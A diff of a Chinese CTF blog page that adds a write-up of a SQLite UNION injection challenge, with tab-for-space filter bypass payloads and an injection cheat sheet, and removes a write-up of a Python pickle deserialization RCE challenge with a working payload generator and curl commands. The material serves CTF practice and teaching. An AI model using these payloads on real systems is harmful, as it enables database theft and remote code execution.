@@ -3633,6 +3633,179 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-21 23:00:00+00:00">2026-11-21</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/sql%E6%B3%A8%E5%85%A5/" class="md-meta__link">SQL注入</a>, 
+              <a href="category/web/" class="md-meta__link">Web</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="bcactf-2024-michaelsoft-gring-tab"><a class="toclink" href="bcactf2024-michaelsoft-gring/">[BCACTF 2024] Michaelsoft Gring — 空格被过滤，就用 Tab</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：SQLite 联合查询注入 — 空格绕过</p>
+<p><strong>Flag</strong>：<code>bcactf{59L_1n1ECTeD_026821}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="bcactf2024-michaelsoft-gring/#_1">题目概述</a></h3>
+<p><strong>题目直接告诉你是 sqlite。</strong>这省掉了一大半判断成本——<strong>不用再去猜 <code>information_schema</code> 还是 <code>sqlite_master</code>。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="bcactf2024-michaelsoft-gring/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="bcactf2024-michaelsoft-gring/#step-1">Step 1：确认注入点</a></h4>
+<p><strong>搜索框输入单引号 <code>'</code>，报错。注入点确认。</strong></p>
+<h4 id="step-2"><a class="toclink" href="bcactf2024-michaelsoft-gring/#step-2">Step 2：空格被过滤了</a></h4>
+<p><strong>正常 payload 里的空格全被吃掉，SQL 拼不起来。</strong></p>
+<p><strong>常见的替代方案有三种，但这里只有一种能用：</strong></p>
+<table>
+<thead>
+<tr>
+<th>替代写法</th>
+<th>能不能用</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/**/</code>（注释当空格）</td>
+<td>❌</td>
+<td><strong><code>/</code> 在 URL 里会被当成路径分隔符</strong>，服务器直接致命错误</td>
+</tr>
+<tr>
+<td><code>%20</code></td>
+<td>❌</td>
+<td>就是空格本体，一样被过滤</td>
+</tr>
+<tr>
+<td><strong><code>%09</code>（Tab）</strong></td>
+<td>✅</td>
+<td><strong>Tab 在 SQL 里和空格等价，且不在过滤名单里</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>所以后面所有 payload 里的空格都写成 <code>%09</code>。</strong></p>
+<h4 id="step-3"><a class="toclink" href="bcactf2024-michaelsoft-gring/#step-3">Step 3：确定列数</a></h4>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="c1">-- </span>
+</span></code></pre></div>
+<p><strong>URL 编码后：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>1'%09UNION%09SELECT%091--
+</span></code></pre></div>
+<p><strong>只有一列。</strong>（多给几列会报错“SELECT 列数不一致”）</p>
+<h4 id="step-4sqlite"><a class="toclink" href="bcactf2024-michaelsoft-gring/#step-4sqlite">Step 4：爆表（SQLite 的关键点）</a></h4>
+<p><strong>SQLite 没有 <code>information_schema</code>，表结构存在 <code>sqlite_master</code> 里：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>1'%09UNION%09SELECT%09group_concat(name)%09FROM%09sqlite_master--
+</span></code></pre></div>
+<p><strong>返回：<code>search,flag</code></strong></p>
+<p><strong>两张表：<code>search</code> 是正常业务表，<code>flag</code> 是目标。</strong></p>
+<h4 id="step-5-flag"><a class="toclink" href="bcactf2024-michaelsoft-gring/#step-5-flag">Step 5：拿 flag——两种做法</a></h4>
+<p><strong>① 直接查那一列</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="c1">--</span>
+</span></code></pre></div>
+<p><strong>② 更省事：查建表语句，一次看到表名+列名</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="mi">1</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="c1">--</span>
+</span></code></pre></div>
+<p><strong>返回类似：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">flag</span><span class="p">(</span><span class="n">flag</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>看到 <code>flag(flag)</code>，就知道表名和列名都是 <code>flag</code>——一条语句搞定“爆表 + 爆列”。</strong></p>
+<p><strong>最终：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>bcactf{59L_1n1ECTeD_026821}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>数据库</td>
+<td>题目直接说是 sqlite，省掉指纹判断</td>
+</tr>
+<tr>
+<td>注入点</td>
+<td>单引号报错</td>
+</tr>
+<tr>
+<td>空格过滤</td>
+<td>用 <code>%09</code>（Tab）替代；<code>/**/</code> 不行，因为 <code>/</code> 在 URL 里是路径符</td>
+</tr>
+<tr>
+<td>列数</td>
+<td>1 列</td>
+</tr>
+<tr>
+<td>表结构</td>
+<td>SQLite 用 <code>sqlite_master</code>，字段有 <code>type</code>、<code>name</code>、<code>sql</code></td>
+</tr>
+<tr>
+<td>一次的取全</td>
+<td><code>group_concat(sql)</code> 能直接拿到建表语句</td>
+</tr>
+<tr>
+<td>注释</td>
+<td><code>--</code> 后面要跟空格（这里用 <code>--%09</code> 或直接 <code>--</code> 结尾）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>SQLite 注入速查</summary>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">-- 表清单</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s1">'table'</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1">-- 建表语句（表名+列名一次看全）</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sqlite_master</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1">-- 拿数据</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span>
+</span></code></pre></div>
+<p><strong>SQLite 没有的东西：</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>information_schema    ✗
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>load_file()           ✗
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>INTO OUTFILE          ✗（默认）
+</span></code></pre></div>
+<strong>所以 sqlite 题基本是“把库读干净”，不是 getshell。</strong></p>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 用 <code>/**/</code> 代替空格</strong></p>
+<p><strong>URL 里的 <code>/</code> 会被服务器当路径处理，直接致命错误</strong>，请求还没到 SQL 就挂了。<strong>这种情况下只能用 <code>%09</code> 或 <code>%0a</code>。</strong></p>
+<p><strong>② 想查 <code>information_schema</code></strong></p>
+<p><strong>SQLite 里根本没有这张表。</strong>表结构在 <code>sqlite_master</code>。</p>
+<p><strong>③ 只爆表不爆列</strong></p>
+<p><strong><code>group_concat(sql)</code> 一条就能同时拿到表名和列名</strong>，比先爆表再爆列少两步。</p>
+<p><strong>④ payload 忘记以 <code>1'</code> 开头</strong></p>
+<p><strong>前面的 <code>1'</code> 是用来闭合原查询的引号的</strong>，单写 <code>UNION SELECT</code> 拼进去是语法错误。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-21 21:15:00+00:00">2026-11-21</time></li>
         
           <li class="md-meta__item">
@@ -5220,196 +5393,6 @@
 <p>如果那个文件被 vim 打开过两次，第一次的 swp 可能已经变成 swo。<strong>后缀要一起试。</strong></p>
 <p><strong>④ 忽略了 <code>index.php~</code></strong></p>
 <p>备份文件是纯文本，比 swp 还好读。<strong>看到 <code>~</code> 结尾的文件优先下它。</strong></p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-17 18:10:00+00:00">2026-11-17</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/python/" class="md-meta__link">Python</a>, 
-              <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
-              <a href="category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="hznuctf-2023-preliminary-picklewp"><a class="toclink" href="hznuctf2023-picklewp/">[HZNUCTF 2023 preliminary] picklewp — 把命令结果写到文件，再换个名字读回来</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Python 反序列化（pickle RCE）+ 关键词过滤绕过</p>
-<p><strong>Flag</strong>：<code>NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="hznuctf2023-picklewp/#_1">题目概述</a></h3>
-<p>进靶场直接给源码。<strong>先把缩进换行整理一遍再读</strong>——粘出来格式全乱了，<code>Shift+Alt+F</code> 走一下。</p>
-<p>源码一共二十行，三个路由。</p>
-<hr />
-<h3 id="_2"><a class="toclink" href="hznuctf2023-picklewp/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="hznuctf2023-picklewp/#step-1">Step 1：读源码，两个点连起来看</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'app.py'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/calc'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="k">def</span><span class="w"> </span><span class="nf">getflag</span><span class="p">():</span>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"payload"</span><span class="p">)</span>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'os'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">''</span><span class="p">))</span>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span class="k">return</span> <span class="s2">"ganbadie!"</span>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/readFile'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">readFile</span><span class="p">():</span>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'filename'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"flag"</span><span class="p">,</span> <span class="s2">"?????"</span><span class="p">)</span>
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span></code></pre></div>
-<p><strong>三个路由各司其职：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>/          直接把源码吐出来（等于免费给源码）
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>/calc      base64 解码 → pickle.loads → 反序列化执行
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>/readFile  读任意文件，但文件名里的 "flag" 会被替换成 "?????"
-</span></code></pre></div>
-<p><strong>所以这题的结构是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>/calc 负责执行命令（把结果写到文件里）
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>/readFile 负责把文件读出来（但文件名不能带 flag）
-</span></code></pre></div>
-<p><strong>两个点必须连起来用——一个没有回显，另一个不能读带 flag 名字的文件。</strong></p>
-<h4 id="step-2calc"><a class="toclink" href="hznuctf2023-picklewp/#step-2calc">Step 2：<code>/calc</code> 的过滤怎么绕</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'os'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">''</span><span class="p">))</span>
-</span></code></pre></div>
-<p><strong>注意执行顺序：先 base64 解码，</strong>再<strong>对解码出来的字节做 <code>os</code> 替换。</strong></p>
-<p><strong>所以只要 payload 里出现连续的 <code>os</code>，就会被删掉——<code>pickle.loads</code> 直接炸。</strong></p>
-<p><strong>绕过方式：字符串拼接。</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="s1">'__import__("o" + "s").system("id")'</span>
-</span></code></pre></div>
-<p><strong>在 pickle 的字节流里，<code>o</code> 和 <code>s</code> 是两个独立的字符，不会形成连续的 <code>os</code>；到运行时它们才拼成 <code>os</code>。</strong></p>
-<p><strong>这是“过滤字符但是执行时拼接”的通用思路。</strong></p>
-<h4 id="step-3-pickle-payload"><a class="toclink" href="hznuctf2023-picklewp/#step-3-pickle-payload">Step 3：构造 pickle payload</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">class</span><span class="w"> </span><span class="nc">evil</span><span class="p">:</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>        <span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">"__import__('o'+'s').system('env &gt; x.txt')"</span><span class="p">,))</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">new</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">evil</span><span class="p">(),</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">))</span>
-</span></code></pre></div>
-<p><strong>三个要点：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>① __reduce__：反序列化时返回 (可调用对象, 参数) → 服务器执行 eval(...)
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>② 'o'+'s' 拼接：避开 replace(b'os', b'')
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>③ urllib.parse.quote：base64 里的 + 必须做 URL 编码
-</span></code></pre></div>
-<h4 id="step-4"><a class="toclink" href="hznuctf2023-picklewp/#step-4">Step 4：为什么 <code>+</code> 必须编码（这题卡最久的地方）</a></h4>
-<p><strong>base64 的字符集里包含 <code>+</code>，而 <code>+</code> 放在 URL 的 query 里会被解码成</strong>空格<strong>。</strong></p>
-<p><strong>于是你发出去的是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>/calc?payload=gAN9cQAo...ab+cd...
-</span></code></pre></div>
-<p><strong>服务器收到的 <code>payload</code> 已经变成：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>gAN9cQAo...ab cd...
-</span></code></pre></div>
-<p><strong>中间多了一个空格，base64 解码直接失败——而 <code>/calc</code> 成功时只返回 <code>ganbadie!</code>，失败时也没有明显报错，</strong>看起来就像“没反应”<strong>。</strong></p>
-<p><strong>所以脚本最后一定要 <code>quote()</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>+  →  %2B
-</span></code></pre></div>
-<p><strong>这也是为什么用 <code>curl -G --data-urlencode</code> 更省事——它替你编码。</strong></p>
-<h4 id="step-5flag"><a class="toclink" href="hznuctf2023-picklewp/#step-5flag">Step 5：第一次读到的“flag”是假的</a></h4>
-<p><strong>先 <code>cat /f*</code>，写进 <code>x.txt</code>，再用 <code>/readFile?filename=./x.txt</code> 读回来：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>flagnothere
-</span></code></pre></div>
-<p><strong>是个干扰文件。</strong></p>
-<p><strong>接着 <code>ls /</code>，根目录下只有一个 <code>flag.sh</code>——读出来也不是真的。</strong></p>
-<p><strong>那就换方向：看环境变量。</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="s2">"__import__('o'+'s').system('env &gt; x.txt')"</span>
-</span></code></pre></div>
-<p><strong><code>/readFile?filename=./x.txt</code> 读回来，flag 在环境变量里：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}
-</span></code></pre></div>
-<hr />
-<table>
-<thead>
-<tr>
-<th>关键点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>/calc</code></td>
-<td><code>pickle.loads(b64decode(payload))</code> → 反序列化即执行</td>
-</tr>
-<tr>
-<td>过滤</td>
-<td><code>.replace(b'os', b'')</code> 作用在<strong>解码后的字节</strong>上</td>
-</tr>
-<tr>
-<td>绕过</td>
-<td><code>'o' + 's'</code> 拼接，字节流里不出现连续 <code>os</code></td>
-</tr>
-<tr>
-<td><code>/readFile</code></td>
-<td>文件名里的 <code>flag</code> 会被替换成 <code>?????</code> → 必须换个名字写</td>
-</tr>
-<tr>
-<td>读写配合</td>
-<td><code>/calc</code> 写文件、<code>/readFile</code> 读回来（无回显题的常规套路）</td>
-</tr>
-<tr>
-<td><code>+</code> 的坑</td>
-<td>base64 的 <code>+</code> 在 query 里会被当空格，必须 <code>quote()</code></td>
-</tr>
-<tr>
-<td>假 flag</td>
-<td><code>flagnothere</code>、<code>/flag.sh</code> 都是干扰，真正的在环境变量</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>完整 payload</summary>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="k">class</span><span class="w"> </span><span class="nc">evil</span><span class="p">:</span>
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">"__import__('o'+'s').system('env &gt; x.txt')"</span><span class="p">,))</span>
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="n">new</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">evil</span><span class="p">(),</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="nb">print</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">))</span>
-</span></code></pre></div>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-G</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"payload=gAN9cQAo...（上面输出的结果）"</span> <span class="s2">"http://目标/calc"</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-G</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"filename=./x.txt"</span> <span class="s2">"http://目标/readFile"</span>
-</span></code></pre></div>
-</details>
-<details class="note">
-<summary>这题踩的坑</summary>
-<p><strong>① <code>__import__['o'+'s']</code> 写成了下标</strong></p>
